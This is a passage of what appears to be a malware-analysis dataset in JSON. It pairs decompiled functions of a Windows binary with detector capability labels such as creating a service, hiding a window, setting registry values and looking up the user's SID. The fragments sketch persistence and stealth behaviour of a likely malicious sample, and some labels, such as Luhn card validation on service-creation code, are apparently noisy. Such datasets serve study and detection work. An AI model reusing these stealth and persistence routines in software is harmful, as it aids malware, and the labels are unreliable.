var_4h._0_1_ = 2;\n                            (**(*hWnd + 8))(hWnd);\n                        }\ncode_r0x004040d9:\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                        break;\n                    }\n                    iVar4 = (***hWnd)(hWnd, 0x4061b0, &var_10h);\n                    if (((iVar4 < 0) || (var_10h == NULL)) ||\n                       (iVar4 = (**(*var_10h + 0x38))(var_10h, &pbstr),  iVar4 < 0)) {\njoined_r0x00404094:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                        goto code_r0x004040d9;\n                    }\n                    if (pbstr == 0) {\njoined_r0x00403ed0:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    else {\n                        fcn.00403ab0(pbstr, &var_24ch, 0x104);\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)(pbstr);\n                        iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_24ch, 0x40742c);\n                        if (iVar1 != 0) goto joined_r0x00403ed0;\n                        var_14h = NULL;\n                        var_4h._0_1_ = 5;\n                        iVar4 = (***hWnd)(hWnd, 0x4061a0, &var_14h);\n                        if ((iVar4 < 0) || (var_14h == NULL)) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\njoined_r0x00404079:\n                            if (var_10h != NULL) {\n                                var_4h._0_1_ = 3;\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                            goto joined_r0x004040cd;\n                        }\n                        iVar4 = (**(*var_14h + 0x20))(var_14h, &var_3ch);\n                        iVar1 = var_3ch;\n                        if (iVar4 < 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            goto joined_r0x00404079;\n                        }\n                        if (var_3ch == 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        else {\n                            var_148h = 0;\n                            puVar6 = &var_147h;\n                            for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n                                *puVar6 = 0;\n                                puVar6 = puVar6 + 1;\n                            }\n                            *puVar6 = 0;\n                            *(puVar6 + 2) = 0;\n                            fcn.00403ab0(iVar1, &var_148h, 0x104);\n                            (*_sym.imp.OLEAUT32.dll_SysStringLen)(var_3ch);\n                            iVar1 = fcn.00403bd0(&var_148h);\n                            if (iVar1 == 0) {\n                                (*_sym.imp.KERNEL32.dll_Sleep)(10);\n                                (**(*var_10h + 0x114))(var_10h);\n                                var_4h._0_1_ = 4;\n                                if (var_14h != NULL) {\n                                    (**(*var_14h + 8))(var_14h);\n                                }\n                                goto joined_r0x00404094;\n                            }\n                            (*_sym.imp.KERNEL32.dll_Sleep)(0);\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                    var_40h = var_40h + 1;\n                } while (var_40h < var_1ch);\n            }\n            var_4h = var_4h._1_3_ << 8;\n            if (var_24h != NULL) {\n                (**(*var_24h + 8))(var_24h);\n            }\n            var_4h = 0xffffffff;\n            iVar1 = var_44h;\n            if (var_20h != NULL) {\n                (**(*var_20h + 8))(var_20h);\n                iVar1 = var_44h;\n            }\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar1);\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    *in_FS_OFFSET = var_ch;\n    return iVar4;\n}\n",
        "token_count": 2449
    },
    "00404570": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open file",
            "write file on Windows"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404570(uint filename, uint mode, uint ptr, uint nitems)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_fopen)(filename, mode);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.MSVCRT.dll_fwrite)(ptr, 1, nitems, iVar1);\n    (*_sym.imp.MSVCRT.dll_fflush)(iVar1);\n    (*_sym.imp.MSVCRT.dll_fclose)(iVar1);\n    return 1;\n}\n",
        "token_count": 131
    },
    "00404660": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00404660(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint hSCManager;\n    uint uVar3;\n    int32_t unaff_EBX;\n    uint32_t unaff_ESI;\n    uint32_t uVar4;\n    uint8_t in_AF;\n    uint var_4h;\n    \n    uVar2 = fcn.00403000(arg_8h, arg_ch);\n    if (uVar2 == 0) {\n        return 0;\n    }\n    uVar4 = unaff_ESI & 0xffff0000 | unaff_ESI + 1;\n    *(uVar2 + 0x58) = arg_ch;\n    if ((uVar4 != 0x222c) && (uVar4 == 0x222c)) {\n        if (uVar4 < 0x222c || unaff_EBX + 1 == 0) {\n            hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)();\n            fcn.00402930(hSCManager, arg_8h);\n            uVar3 = fcn.004044f0(hSCManager, arg_8h, arg_ch);\n            (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n            return uVar3;\n        }\n        in_AF = 9 < (uVar2 & 0xf) | in_AF;\n        piVar1 = (uVar2 & 0xffff0000 | CONCAT11((uVar2 >> 8) + in_AF, uVar2 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n        *piVar1 = *piVar1 - (unaff_EBX + 1);\n    }\n    fcn.00403000(arg_8h, arg_ch);\n    return 1;\n}\n",
        "token_count": 436
    },
    "004046f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004046f0(uint arg_8h, uint arg_ch)\n\n{\n    uint hSCManager;\n    uint uVar1;\n    uint var_4h;\n    \n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)();\n    fcn.00402930(hSCManager, arg_8h);\n    uVar1 = fcn.004044f0(hSCManager, arg_8h, arg_ch);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 141
    },
    "00404770": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040477f) overlaps instruction at (ram,0x0040477e)\n// \n\nvoid fcn.00404770(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    bool in_OF;\n    \n    if (((!in_OF) && (in_OF)) || (in_EAX = *0x423658,  *0x423658 == 0)) {\n        *unaff_EDI = *unaff_ESI;\n        *(unaff_EBP + 0x533275c0) = *(unaff_EBP + 0x533275c0) + in_EAX + '\\x01';\n        uVar1 = (*_sym.imp.MSVCRT.dll_time)(0);\n        (*_sym.imp.MSVCRT.dll_srand)(uVar1);\n        *0x423658 = 1;\n    }\n    return;\n}\n",
        "token_count": 224
    },
    "004034f0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "get session user name"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004034f0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_31ch;\n    uint lpBuffer;\n    uint Sid;\n    uint var_10h;\n    uint pcbBuffer;\n    uint var_8h;\n    uint var_4h;\n    \n    pcbBuffer = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(&lpBuffer, &pcbBuffer);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    var_4h = 0x104;\n    var_8h = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)(0, &lpBuffer, &Sid, &var_4h, *0x10 + -800, *0x10 + -0xc, 0xec);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)(&Sid, arg_8h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 265
    },
    "00403ae0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403b67) overlaps instruction at (ram,0x00403b65)\n// \n\nbool fcn.00403ae0(void)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uint *unaff_ESI;\n    uint *puVar3;\n    bool bVar4;\n    uchar pvData;\n    uint var_10bh;\n    uint pdwType;\n    uint pcbData;\n    \n    pvData = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    pcbData = 0x104;\n    *(puVar3 + 2) = 0;\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHGetValueA)(0x80000002, 0x407460, 0x407488, &pdwType, &pvData, &pcbData);\n    if (iVar2 != 0) {\n        return false;\n    }\n    if ((-1 < iVar2) && (-1 >= iVar2)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    puVar1 = (*_sym.imp.MSVCRT.dll_strchr)(&pvData, 0x2e);\n    bVar4 = puVar1 == NULL;\n    if (bVar4) {\n        return false;\n    }\n    if ((!bVar4) && (bVar4)) {\n        *(puVar3 + 3) = *unaff_ESI;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    *puVar1 = 0;\n    iVar2 = (*_sym.imp.MSVCRT.dll_atoi)(&pvData);\n    if (iVar2 == 6) {\n        return true;\n    }\n    return iVar2 == 7;\n}\n",
        "token_count": 469
    },
    "004044f0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004044f0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)(arg_8h, arg_ch, arg_ch, 0xf01ff, 1, 0, 1, arg_10h, 0, 0, 0, 0, 0);\n    if (iVar1 != 0) {\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 139
    },
    "00404610": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nuint __cdecl fcn.00404610(uint arg_8h)\n\n{\n    uint32_t *in_EAX;\n    uint uVar1;\n    uint8_t *in_EDX;\n    bool in_CF;\n    \n    if (!in_CF) {\n        if (in_CF) {\n            if (&stack0xfffffffc < *in_EAX || in_EAX == 0xffffffff) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            *in_EDX = *in_EDX >> 1;\n            (*_sym.imp.MSVCRT.dll_fclose)();\n            return 1;\n        }\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return uVar1;\n}\n",
        "token_count": 203
    },
    "00404c30": {
        "rules": [
            "hide graphical window"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404c7b)\n\nuint __cdecl fcn.00404c30(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, 0x423618, 0x42365c, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    if (iVar1 != 0) {\n        (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 156
    },
    "00402080": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nuint fcn.00402080(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x407104);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (iVar2 == 0) {\n        return 0;\n    }\n    *0x423628 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x407114);\n    *0x42362c = (*pcVar1)(iVar2, 0x407130);\n    *0x423630 = (*pcVar1)(iVar2, 0x407140);\n    if (((*0x423628 != 0) && (*0x42362c != 0)) && (*0x423630 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 196
    },
    "004032b0": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.004032b0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4071d8, 0x40721c, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 81
    }
}